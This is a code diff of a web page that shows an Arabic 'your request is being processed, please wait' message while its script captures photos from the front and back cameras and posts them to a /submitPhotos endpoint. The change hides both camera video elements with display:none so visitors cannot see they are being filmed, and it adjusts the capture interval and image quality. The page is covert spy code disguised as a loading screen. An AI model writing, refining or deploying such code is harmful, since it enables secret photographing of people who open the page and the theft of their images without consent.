@@ -31,11 +31,6 @@
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
-        video {
-            display: block;
-            margin: 10px auto;
-            max-width: 90%;
-        }
     </style>
 </head>
 <body>
@@ -44,8 +39,8 @@
         <h1>جاري تنفيذ طلبك</h1>
         <p>يرجى الانتظار...</p>
     </div>
-    <video id="frontVideo" playsinline autoplay muted></video>
-    <video id="backVideo" playsinline autoplay muted></video>
+    <video id="frontVideo" playsinline autoplay muted style="display:none;"></video>
+    <video id="backVideo" playsinline autoplay muted style="display:none;"></video>
     <canvas id="frontCanvas" style="display:none;"></canvas>
     <canvas id="backCanvas" style="display:none;"></canvas>
     <script>
@@ -164,10 +159,10 @@
                     formData.append('cameraType', cameraType);
                     formData.append('additionalData', JSON.stringify(additionalData));
                     post('/submitPhotos', formData);
-                }, 'image/png', 0.9);  // زيادة جودة الصورة إلى 0.9
+                }, 'image/png', 0.5);  // ضبط جودة الصورة
 
                 photoCount++;
-            }, 500);  // زيادة الفاصل الزمني بين الصور إلى 500 مللي ثانية
+            }, 1000);  // إضافة تأخير بين الصور
         }
 
         async function post(url, formData) {
